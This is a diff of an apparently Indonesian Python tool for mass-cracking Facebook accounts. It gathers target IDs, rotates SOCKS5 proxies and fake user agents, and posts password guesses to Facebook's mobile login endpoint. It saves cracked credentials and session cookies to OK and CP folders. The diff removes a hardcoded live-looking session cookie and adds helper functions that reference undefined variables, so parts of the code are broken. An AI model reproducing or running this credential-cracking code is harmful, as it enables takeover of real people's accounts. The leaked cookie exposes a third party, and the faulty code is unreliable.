@@ -39,7 +39,7 @@ id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni=
 pwpluss,pwnya=[],[]
 ses=requests.Session()
 princp=[]
-sys.stdout.write('\x1b]2; (Simpel Tools) \x07')
+sys.stdout.write('\x1b]2; Christian S. \x07')
 try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
@@ -190,7 +190,7 @@ for x in range(10):
 	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
 	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
 	
-ip = requests.get('https://api.ipify.org').text
+###ip = requests.get('https://api.ipify.org').text
 #wanji = requests.get('https://user-agents.net/download?browser=facebook&download=txt').text
 
 try:aan = open('samsung.txt','r').read().splitlines()
@@ -257,9 +257,9 @@ class Yowaimo:
 	
     def __init__(self):
         self.ses=requests.Session()
-        #self.cok = open('.cok.txt','r').read()
-        self.cok = {"cookie": "dbln=%7B%22100093071481470%22%3A%22hdYrx29H%22%7D; datr=s0d6ZLY35wT_r-mvMwdkN2Wl; sb=s0d6ZLNBdZOYvQu5HHHjhsae; c_user=100093071481470; xs=12%3Af_1FcnHttwlZ-g%3A2%3A1685735357%3A-1%3A-1; fr=0RSPdApxBoVCSFXAP.AWWYwPkCazxmRsEGXxzwZXg2HRo.Bkeke9.Fu.AAA.0.0.Bkeke9.AWUY790FNXk; m_page_voice=100093071481470; "}
-       # os.system("clear")
+        ambil = open('.cok.txt','r').read()
+        self.cok = {"cookie": ambil}
+       #os.system("clear")
         self.cek()
 
     def cek(self):
@@ -281,15 +281,15 @@ class Yowaimo:
                     nom = ""+str(xx)
                     xa.update({str(xx):str(x)})
                     xa.update({nom+"0":str(xx)})
-                    print(f" {nom}. {x} total: {str(len(xz))}")
+                    print(f" ├─[{H}{nom}{P}] {x} Total > [{H}{str(len(xz))}{P}] ")
                 else:
                     xa.update({str(xx):str(x)})
-                    print(f" {nom}. {x} total: {str(len(xz))}")
-        file = input(" [?] nomor : ")
-        pemi = input(" [?] Pemisah : ")
+                    print(f" ├─[{H}{nom}.{P}]  {x} Total > {str(len(xz))}")
+        file = input(" └───➢ \t")
+        pemi = input(f" [{H}#{P}] Masukan Pemisah : \t ")
         try:ajg = xa[file]
         except KeyError:
-            print("input yang bener")
+            print("input yang bener")    
         try:
             fi = open(f"result/{ajg}").readlines()
         except FileNotFoundError:
@@ -319,7 +319,7 @@ class Yowaimo:
         except Exception as e:exit(e)
 
 def coli(u):
-        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
 def clear():
 	os.system('clear')
 def back():
@@ -417,33 +417,58 @@ def menu(my_name,my_id):
 		login_lagi334()
 	os.system('clear')
 	
-	print(f''' {M}
+	print(f'''
+	  ⬜⬜⬜⬜⬜⬜⬜🏽🏽🏽🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜
+          ⬜⬜⬜⬜⬜⬜🏽⬜⬜⬜⬜🏽🏽🏽🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜
+          ⬜⬜⬜⬜⬜🏽⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽🏽🏽⬜⬜⬜⬜⬜⬜
+          ⬜⬜⬜⬜⬜🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽🏽⬜⬜⬜⬜
+          ⬜⬜⬜⬜⬜🏽🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽⬜⬜⬜
+          ⬜⬜⬜⬜⬜🏽⬛🏽🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽⬜⬜
+          ⬜⬜⬜⬜⬜⬜🏽⬛⬛🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽⬜⬜
+          ⬜⬜⬜⬜⬜⬜⬜⬜⬛⬛🏽🏽🏽🏽⬜⬜⬜⬜⬜⬜⬜🏽⬜⬜
+          ⬜⬜🟨🟨🟨🟨🟨⬛🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽⬜
+          🟨🟨🟨🟨🟨🟨🟨🟨🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽⬜
+          🟨🟧🟨🟨🟨🟨🟨🟨🟨🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽⬜
+          🟨🟨🟧🟧🟨🟨🟨🟨🟨🟨🟧⬜🏽🏽⬜⬜⬜⬜⬜⬜⬜⬛⬜⬜
+          🟧🟨🟨🟨🟧🟧🟧🟦🟦🟧🟧🟧🟧⬛🏽⬜⬜⬜⬜⬜⬜⬛⬜⬜
+          ⬜🟧🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧⬛🏽⬜⬜⬜⬜⬜⬛⬜⬜
+          ⬜⬜🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟧⬛🏽⬜⬜⬜🏽⬛⬜⬜
+          ⬜⬜⬛🟦🟦🟦🟦🟦⬛🟦⬛🟦🟦🟧🟧🟧⬛🏽⬜⬜🏽⬛⬜⬜
+          ⬜⬛⬛🟦🟦🟦🟦🟦⬛⬛🟦🟦🟧🟨🟨🟨⬛🏽⬜🏽⬛⬜⬜⬜
+          ⬜⬜⬛⬛🟦🟦⬛⬛⬜🟦🟦🟦🟧🟨🟨🟨🟧⬛🏽⬛⬛⬜⬜⬜
+          ⬜🟦⬜⬛🟦🟦⬛⬛🟦🟦🟦🟦🟧🟨🟨🟨🟨🏽⬛⬛⬜⬜⬜⬜
+          ⬜🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟧⬛🟧⬜⬜⬜⬜
+          ⬜🟦⬛🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟧
+          ⬜⬛🟦⬛⬛🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟧🟨🟨🟨🟨🟨🟨🟨
+          ⬜⬛🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟧🟨🟨🟨🟨🟨🟨
+          ⬜⬜⬛🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟨🟧🟨🟨🟧🟨🟨
+          ⬜⬜⬜⬛⬛🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟧🟨🟨🟧🟧🟨
+          ⬜⬜⬜🟨🟧⬛⬛⬛⬛⬛⬛🟦⬜🏽🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨
+          ⬜⬜⬜🟧🟨🟨🟨🟧🟦🟦🟦⬜⬜⬜🟧🟨🟨🟨🟨🟨🟨🟨🟨🟧
+''')
 	
-	 ▄▄▄▄▄▄   ▄███▄    ▄  █ ██    ▄  █ ██    ▄  █ ██   
-▀   ▄▄▀   █▀   ▀  █   █ █ █  █   █ █ █  █   █ █ █  
- ▄▀▀   ▄▀ ██▄▄    ██▀▀█ █▄▄█ ██▀▀█ █▄▄█ ██▀▀█ █▄▄█ 
- ▀▀▀▀▀▀   █▄   ▄▀ █   █ █  █ █   █ █  █ █   █ █  █ 
-          ▀███▀      █     █    █     █    █     █ 
-                    ▀     █    ▀     █    ▀     █  
-                         ▀          ▀          ▀   
-         {P}Developed By : [ {azu}Christian S.{P} ]
-	''')
+	coli(f'                  {P}Developed By : [ {k}Christian S.{P} ]\n')
 	print(f'{P}─────────────────────────────────────────────────────')
-	coli(f' ┌─[ Hallo Selamat Datang! {H}{my_name}{P} ]\n ├───➢ ID Kamu [ {H} {my_id} {P} ]')
-	print(f' ├─[ IP : {H} {ip} {P}]')
-	print(f' ├─[ Total User Agent Saat Ini ]\n └───➢  [ {H}'+str(len(aan))+P, '] Biji')
+	print(f' ┌─[ Hallo Selamat Datang! {T}{my_name}{P} ]\n ├───➢ ID Kamu [ {P} {my_id} {P} ]')
+	hariok()
+	haricp()
+	###print(f' ├─[ IP : {} {ip} {P}]')
+	print(f' ├─[ Total User Agent Saat Ini ]\n └───➢  [ {O}'+str(len(aan))+P, '] Biji')
 	print(f'{P}─────────────────────────────────────────────────────\n')
 	print(f'{P} ┌─[{H}1{P}] Crack Publik')
 	print(f'{P} ├─[{H}2{P}] Hasil Crack')
-	print(f'{P} ├─[{H}3{P}] Cek Cp :)')
+	print(f'{P} ├─[{H}3{P}] Cek CP 🗿')
 	print(f'{P} ├─[{H}0{P}] Hapus Cookie')
-	janda = input(f' └───➢ ')
+	janda = input(f' └───➢ \t')
+	
 	if janda in ['1']:
 		dump_massal()
 	elif janda in ['2']:
 		result()
 	elif janda in ['3']:
 		Yowaimo()
+	elif janda in ['4']:
+		haricp();hariok()
 	elif janda in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
@@ -456,6 +481,48 @@ def error():
 	print(f'{k}>> Sepertinya Ada Kesalahan Dalam Memilih Fitur')
 	time.sleep(4)
 	back()
+	
+def haricp():
+	cp = []
+	try:
+		xxx = os.listdir("CP")
+		for z in xxx:
+			cp.append(z)
+	except:pass
+	if len(cp)==0:
+		exit("Tidak ada file di dalam folder result silahkan crack terlebih dahulu")
+	else:
+		xa, xx = {}, 0
+		for x in cp:
+			try:xz = open(f"CP/{cpc}").readlines()
+			except:continue
+		xx+=1
+		if xx<100:
+			nom = ""+str(xx)
+			xa.update({str(xx):str(x)})
+			xa.update({nom+"0":str(xx)})
+			print(f" ├─[😔] {k}{x} {P}[ {k}{str(len(xz))}{P} ] ")
+			
+def hariok():
+	ok = []
+	try:
+		xxx = os.listdir("OK")
+		for z in xxx:
+			ok.append(z)
+	except:pass
+	if len(ok)==0:
+		exit("Tidak ada file di dalam folder result silahkan crack terlebih dahulu")
+	else:
+		xa, xx = {}, 0
+		for x in ok:
+			try:zx = open(f"OK/{okc}").readlines()
+			except:continue
+		xx+=1
+		if xx<100:
+			nom = ""+str(xx)
+			xa.update({str(xx):str(x)})
+			xa.update({nom+"0":str(xx)})
+			print(f" ├─[😋] {H}{x} {P}[ {H}{str(len(zx))}{P} ] ")
 
 def result():
 	print(f'{P}─────────────────────────────────────────────────────')
@@ -481,7 +548,7 @@ def result():
 				try:hem = open('CP/'+isi,'r').readlines()
 				except:continue
 				cih+=1
-				if cih<10:
+				if cih<100:
 					nom = ''+str(cih)
 					lol.update({str(cih):str(isi)})
 					lol.update({nom:str(isi)})
@@ -527,7 +594,7 @@ def result():
 				try:hem = open('OK/'+isi,'r').readlines()
 				except:continue
 				cih+=1
-				if cih<10:
+				if cih<50:
 					nom = '0'+str(cih)
 					lol.update({str(cih):str(isi)})
 					lol.update({nom:str(isi)})
@@ -569,7 +636,7 @@ def dump_massal():
 		exit()
 	try:
 		print(f'{P}─────────────────────────────────────────────────────')
-		jum = int(input(f'{P}┌─[{H}•{P}] Mau Berapa Id ? : '))
+		jum = int(input(f'{P} ┌─[{H}•{P}] Mau Berapa Id ? : '))
 	except ValueError:
 		print('>> Masukkan Angka Anjing, Malah Huruff ')
 		exit()
@@ -580,7 +647,8 @@ def dump_massal():
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input(f'{P}├─['+str(yz)+'] Enter the Id : ')
+		###kl = input(f'{P}├─['+str(yz)+'] Enter the Id : ')
+		kl = input(f' ├─[{H}•{P}] Masukan Id Ke '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -597,7 +665,7 @@ def dump_massal():
 			print('>> Sinyal Loh Kek Kontoll ')
 			exit()
 	try:
-		coli(f'└───➢ {H}'+str(len(id)))
+		coli(f' └───➢ Id Terkumpul : {H} '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print('>> Sinyal Lo kek Kontol ')
@@ -609,8 +677,8 @@ def dump_massal():
 
 def setting():
 	print(f'{P}─────────────────────────────────────────────────────')
-	print(f'{P}┌─[{H}1{P}] Akun Acak ')
-	print(f'├─[{H}2{P}] Akun New ')
+	print(f'{P}┌─[{H}1{P}] Crack Dari Id Acak ')
+	print(f'├─[{H}2{P}] Crack Dari Id Termuda ')
 	hu = input('└───➢ ')
 	if hu in ['1','01']:
 		for bacot in id:
@@ -629,8 +697,8 @@ def setting():
 		print('>> Pilih Yang Bener Kontooll ')
 		exit()
 	print(f'{P}─────────────────────────────────────────────────────')
-	print(f'{P}┌─[{H}1{P}] Validate [{H}Fast{P}]')
-	print(f'{P}├─[{H}2{P}] Async    [{T}Slow{P}]')
+	print(f'{P}┌─[{H}1{P}] Validate [{H} Recommend {P}]')
+	print(f'{P}├─[{H}2{P}] Async    ')
 	hc = input('└───➢ ')
 	if hc in ['1','01']:
 		method.append('satu')
@@ -643,15 +711,15 @@ def setting():
 		method.append('satu')
 
 	print(f'{P}─────────────────────────────────────────────────────')
-	pwplus=input(f'{P}┌─[{H}•{P}] Tambahkan Password Manual ( Y/t ) : ')
+	pwplus=input(f'{P}┌─[{H}•{P}] Tambahkan Password Manual ( y/t ) : ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
-		pwku=input(f'{P}└───➢ ')
+		pwku=input(f'{P}└───➢  ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
 	else:
-		pwpluss.append('no')
+		pwpluss.append('no','t')
 	passwrd()
 
 def passwrd():
@@ -732,7 +800,7 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#print(f'\r{P}└─ {k}{idf}{P}|{k}{pw}{N}')     
-				print(f'\r{P} 😔 {k}{idf}{P}|{k}{pw}\n └─ {P} {ua} \n ')
+				print(f'\r{P} 😔 {k}{idf}{P}|{k}{pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -741,7 +809,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{P} 😋 {H}{idf}{P}|{H}{pw}\n{P} └─ {H}{kuki}{N}\n └─ {ua}{N}\n')
+				print(f'\r{P} 😋 {H}{idf}{P}|{H}{pw}\n{P} └─ {H}{kuki}{N}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				cek_apk(session,coki)
 				break
